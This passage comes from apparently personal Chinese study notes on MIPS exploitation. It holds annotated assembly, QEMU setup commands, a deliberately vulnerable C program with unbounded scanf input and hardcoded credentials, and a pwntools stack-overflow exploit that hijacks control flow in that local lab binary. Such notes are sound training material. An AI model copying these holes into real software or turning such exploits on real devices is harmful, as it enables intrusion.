+lw      $a1, 0x28+var_8($fp)
+lui     $v0, 0x40  # '@'
+addiu   $a0, $v0, (aShiftLeftD - 0x400000)  # "Shift Left: %d\n"
+la      $v0, printf
+move    $t9, $v0
+jalr    $t9 ; printf
+nop
+#lw      $gp, 0x28+var_18($fp)：恢复 $gp。
+#lw      $a1, 0x28+var_8($fp)：加载左移操作结果到 $a1。
+#lui     $v0, 0x40：加载高位立即数。
+#addiu   $a0, $v0, (aShiftLeftD - 0x400000)：设置字符串 "Shift Left: %d\n" 的地址。
+#la      $v0, printf：加载 printf 函数的地址。
+#move    $t9, $v0：将 printf 地址移动到 $t9。
+#jalr    $t9 ; printf：调用 printf 函数。
+打印右移操作结果
+lw      $gp, 0x28+var_18($fp)
+lw      $a1, 0x28+var_4($fp)
+lui     $v0, 0x40  # '@'
+addiu   $a0, $v0, (aShiftRightD - 0x400000)  # "Shift Right: %d\n"
+la      $v0, printf
+move    $t9, $v0
+jalr    $t9 ; printf
+nop
+#lw      $gp, 0x28+var_18($fp)：恢复 $gp。
+#lw      $a1, 0x28+var_4($fp)：加载右移操作结果到 $a1。
+#lui     $v0, 0x40：加载高位立即数。
+#addiu   $a0, $v0, (aShiftRightD - 0x400000)：设置字符串 "Shift Right: %d\n" 的地址。
+#la      $v0, printf：加载 printf 函数的地址。
+#move    $t9, $v0：将 printf 地址移动到 $t9。
+#jalr    $t9 ; printf：调用 printf 函数。
+恢复栈帧并返回
+lw      $gp, 0x28+var_18($fp)
+nop
+move    $sp, $fp
+lw      $ra, 0x28+var_s4($sp)
+lw      $fp, 0x28+var_s0($sp)
+addiu   $sp, 0x30
+jr      $ra
+nop
+#lw      $gp, 0x28+var_18($fp)：恢复 $gp。
+#move    $sp, $fp：恢复栈指针。
+#lw      $ra, 0x28+var_s4($sp)：恢复返回地址。
+#lw      $fp, 0x28+var_s0($sp)：恢复帧指针。
+#addiu   $sp, 0x30：释放栈空间。
+#jr      $ra：返回到调用者。
+#nop：无操作。
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div>
+<h3 id="卸载并重新安装-qemu" class="source-line" data-source-line="615">卸载并重新安装 QEMU<a class="vx-header-anchor" href="#卸载并重新安装-qemu" vx-data-anchor-icon="¶"></a></h3>
+<p class="source-line" data-source-line="616">卸载并重新安装 QEMU，您可以按照以下步骤进行：</p>
+<p class="source-line" data-source-line="618">卸载 QEMU：</p>
+<p class="source-line" data-source-line="620">使用以下命令卸载 QEMU：<br>
+sudo apt-get remove qemu-system<br>
+如果您使用的是特定的 QEMU 包，例如 qemu-system-mips，可以将命令中的名称相应替换。<br>
+清理残留配置（可选）：</p>
+<p class="source-line" data-source-line="625">如果您希望删除 QEMU 的配置文件和依赖项，可以运行：<br>
+sudo apt-get purge qemu-system<br>
+重新安装 QEMU：</p>
+<p class="source-line" data-source-line="629">卸载完成后，重新安装 QEMU：<br>
+sudo apt-get update<br>
+sudo apt-get install qemu-system<br>
+根据您的需要安装特定的 QEMU 包，如 qemu-system-mips 等。<br>
+验证安装：</p>
+<p class="source-line" data-source-line="635">安装完成后，您可以运行以下命令检查 QEMU 是否成功安装：<br>
+qemu-system-mips --version<br>
+这将显示 QEMU 的版本信息，确认安装是否正确。</p>
+<h3 id="第二节课" class="source-line" data-source-line="640">第二节课<a class="vx-header-anchor" href="#第二节课" vx-data-anchor-icon="¶"></a></h3>
+<h5 id="作业" class="source-line" data-source-line="642">作业<a class="vx-header-anchor" href="#作业" vx-data-anchor-icon="¶"></a></h5>
+<ul>
+<li class="source-line" data-source-line="643">栈溢出</li>
+<li class="source-line" data-source-line="644">要有判断再进溢出函数</li>
+<li class="source-line" data-source-line="645">mips</li>
+<li class="source-line" data-source-line="646">写exp</li>
+</ul>
+<div class="code-toolbar"><pre class="language-txt line-numbers"><code class="source-line language-txt" data-source-line="648">const char username[8] = { 0x2F,0x09,0x12,0x35,0x03,0x24,0x07,0x09};
+const char password[7] = { 0x07,0x04,0x05,0x02,0x03,0x00,0x01};
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></div>
+<p class="source-line" data-source-line="653">test_stack_overl.c</p>
+<div class="code-toolbar"><pre class="language-txt line-numbers"><code class="source-line language-txt" data-source-line="654">#include &lt;stdio.h&gt;
+#include &lt;stdbool.h&gt;
+#include &lt;stdint.h&gt;
+#include &lt;string.h&gt;
+#include &lt;stdlib.h&gt;
+
+// CRC32表，使用多项式0xEDB88320
+static uint32_t crc32_table[256];
+char username[8] = { 0x2F,0x09,0x12,0x35,0x03,0x24,0x07,0x09 };
+char password[7] = { 0x07,0x04,0x05,0x02,0x03,0x00,0x01 };
+
+void Decode(char* buf, int size)
+{
+    for (int i = 0; i &lt; size; i++)
+    {
+        buf[i] = buf[i] ^ 0x66;
+    }
+}
+
+char var_usename[25] = { 0 };
+char var_password[25] = { 0 };
+
+bool CmpMemory(char* buf1, char* buf2, int cmpsize)
+{
+    for (int i = 0; i &lt; cmpsize; i++)
+    {
+        if (buf1[i] != buf2[i])
+        {
+            return false;
+        }
+    }
+    return true;
+}
+
+void excute_system_function()
+{
+    system("ls");
+    exit(0);
+}
+
+
+// 初始化CRC32表
+void Crc_Make_table() {
+    for (uint32_t i = 0; i &lt; 256; i++) {
+        uint32_t crc = i;
+        for (int j = 0; j &lt; 8; j++) {
+            if (crc &amp; 1)
+                crc = (crc &gt;&gt; 1) ^ 0xEDB88320;
+            else
+                crc &gt;&gt;= 1;
+        }
+        crc32_table[i] = crc;
+    }
+}
+
+// 计算CRC32校验和
+uint32_t calculate_crc32(const unsigned char* buffer, size_t size) {
+    uint32_t crc = 0xFFFFFFFF;
+    for (size_t i = 0; i &lt; size; i++) {
+        crc = (crc &gt;&gt; 8) ^ crc32_table[(crc ^ buffer[i]) &amp; 0xFF];
+    }
+    return crc ^ 0xFFFFFFFF;
+}
+
+
+void Init_canary(char* buffer, size_t size, volatile uint32_t* p_canary) {
+    uint32_t crc = calculate_crc32((const unsigned char*)buffer, size);
+    *p_canary = crc;
+}
+
+bool Check_canary(volatile uint32_t* p_canary, volatile uint32_t* p_gcanary) {
+
+    if (*p_canary != *p_gcanary)
+    {
+        return false;
+    }
+    else
+    {
+        return true;
+    }
+}
+
+volatile uint32_t canary_Print;
+void Print()
+{
+    char buf[0x10];
+    volatile uint32_t canary;
+    Init_canary((char*)&amp;canary, 0x100, &amp;canary);
+    canary_Print = canary;
+    
+    scanf("%s", buf);
+    bool bRet = Check_canary(&amp;canary, &amp;canary_Print);
+    if (!bRet)
+    {
+        printf("error\r\n");
+        exit(0);
+    }
+    printf("%s\r\n", buf);
+}
+
+volatile uint32_t canary_Longin;
+void Longin()
+{
+    volatile uint32_t canary;
+    Init_canary((char*)&amp;canary, 0x100, &amp;canary);
+    canary_Longin = canary;
+
+    scanf("%s", var_usename);
+    scanf("%s", var_password);
+    Decode(username, 8);
+    Decode(password, 7);
+    bool bRet = CmpMemory(var_usename, username, 8);
+    if (!bRet)
+    {
+        printf("your username is error...\r\n");
+        exit(0);
+    }
+    bRet = CmpMemory(var_password, password, 7);
+    if (!bRet)
+    {
+        printf("your password is error...\r\n");
+        exit(0);
+    }
+    else
+    {
+        Print();
+    }
+
+    bRet = Check_canary(&amp;canary, &amp;canary_Longin);
+    if (!bRet)
+    {
+        printf("error");
+        exit(0);
+    }
+}
+
+
+int main()
+{
+    Longin();
+}
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div>
+<p class="source-line" data-source-line="798"><a href="http://expdemo.py">expdemo.py</a></p>
+<div class="code-toolbar"><pre class="language-txt line-numbers"><code class="source-line language-txt" data-source-line="799">from pwn import *
+import struct
+# 设置上下文为MIPS大端
+context.update(arch='mips', endian='big')
+
+
+# 设置要执行的目标函数地址，假设为win函数的地址
+back_door = 0x004007b0
+
+# 使用QEMU启动目标程序
+qemu_cmd = ['qemu-mips','-L', '/usr/mips-linux-gnu','./test_stack_overl']
+p = process(qemu_cmd)
+
+
+#p.recv()
+p.sendline(b"IotSeBao")
+
+#p.recv()
+p.sendline(b"abcdefg")
+get_flag_addr = 0x00400894
+canary = 0Xffffffff
+
+
+#&lt;：小端字节顺序
+#&gt;：大端字节顺序
+#i：有符号整型（4 字节）
+#I：无符号整型（4 字节）
+# 构造payload
+#p.recv()
+payload = b'A' * 16 +struct.pack('&gt;I', canary)+ b'A'*4 +struct.pack('&gt;I', get_flag_addr)
+
+# 发送payload
+p.sendline(payload)
+
+# 进入交互模式
+p.interactive()
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div>
+<h3 id="mips-shellcode学习" class="source-line" data-source-line="839">Mips shellcode学习<a class="vx-header-anchor" href="#mips-shellcode学习" vx-data-anchor-icon="¶"></a></h3>
+<p class="source-line" data-source-line="840">mips官方调用号文档<br>
+<a href="https://www.linux-mips.org/wiki/Syscall">Syscall</a><br>
+github查看调用号<br>
+<a href="https://github.com/spotify/linux/blob/master/arch/mips/include/asm/unistd.h">unistd.h</a></p>
+<p class="source-line" data-source-line="845"><a href="https://fireshellsecurity.team/writing-a-shellcode-for-mips32/">Writing a shellcode for MIPS32</a><br>
+简单示例：</p>
+<div class="code-toolbar"><pre class="language-txt line-numbers"><code class="source-line language-txt" data-source-line="847">asm volatile (
+    "add %0, %1, %2;"  // MIPS add指令：add result, a, b
+    : "=r" (result)    // 输出操作数：使用通用寄存器r作为输出
+    : "r" (a), "r" (b) // 输入操作数：a和b使用通用寄存器r
+);
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></div>
+<p class="source-line" data-source-line="854">内联汇编语法<br>
+asm volatile (<br>
+"add %0, %1, %2;"  // MIPS add指令：add result, a, b<br>
+: "=r" (result)    // 输出操作数：使用通用寄存器r作为输出<br>
+: "r" (a), "r" (b) // 输入操作数：a和b使用通用寄存器r<br>
+);<br>
+解释：<br>
+asm volatile: 这是GCC用来引入内联汇编的关键字。volatile 关键字告诉编译器不要对这段汇编代码进行优化，确保其原样插入到生成的汇编代码中。在汇编语言中，volatile 告诉编译器不要对汇编代码进行重排或优化。</p>
+<p class="source-line" data-source-line="863">汇编模板 ("add %0, %1, %2;"):</p>
+<p class="source-line" data-source-line="865">"add %0, %1, %2;" 是实际的MIPS汇编指令。在MIPS汇编中，add 指令用于将两个操作数相加，并将结果存储在第一个操作数中。这里 %0, %1, %2 是操作数占位符，分别代表输出操作数 (result) 和输入操作数 (a, b)。<br>
+操作数约束:</p>
+<p class="source-line" data-source-line="868">: "=r" (result): 这是输出操作数约束，告诉GCC将变量 result 映射到一个通用寄存器 (r 类型寄存器) 并将其用作输出。<br>
+: "r" (a), "r" (b): 这是输入操作数约束，告诉GCC将变量 a 和 b 分别映射到通用寄存器，并将它们用作输入。<br>
+为什么要这么写？<br>
+输出操作数约束 ("=r" (result)): 使用 =r 表示这是一个输出操作数，并且使用通用寄存器来存储结果。result 是C语言中的变量，使用 =r 约束将其映射到一个通用寄存器，使得汇编指令执行后可以将结果返回到 result 变量中。</p>
+<p class="source-line" data-source-line="873">输入操作数约束 ("r" (a), "r" (b)): 使用 "r" 表示这些是输入操作数，并且也使用通用寄存器来传递变量 a 和 b 的值给汇编指令。在MIPS汇编中，通用寄存器用于存储操作数和执行算术操作。</p>
+<p class="source-line" data-source-line="875">通用寄存器约束的灵活性: 使用 r 类型约束可以让GCC自由选择任意通用寄存器，这样可以提高代码的灵活性和可移植性。GCC会负责分配寄存器并生成适当的机器代码来执行指定的操作。</p>
+</div>
+        </div>
+    </div>
+    </div>
+
+    <!-- VX_OUTLINE_BUTTON_START -->
+    <div id="container-floating" style="display:none;" class="d-none d-md-block d-xl-block">
+        <div id="floating-button" onclick="toggleMore()">
+            <p id="floating-more" class="more">&gt;</p>
+        </div>
+    </div>
+    <!-- VX_OUTLINE_BUTTON_END -->
+</body>
+</html>
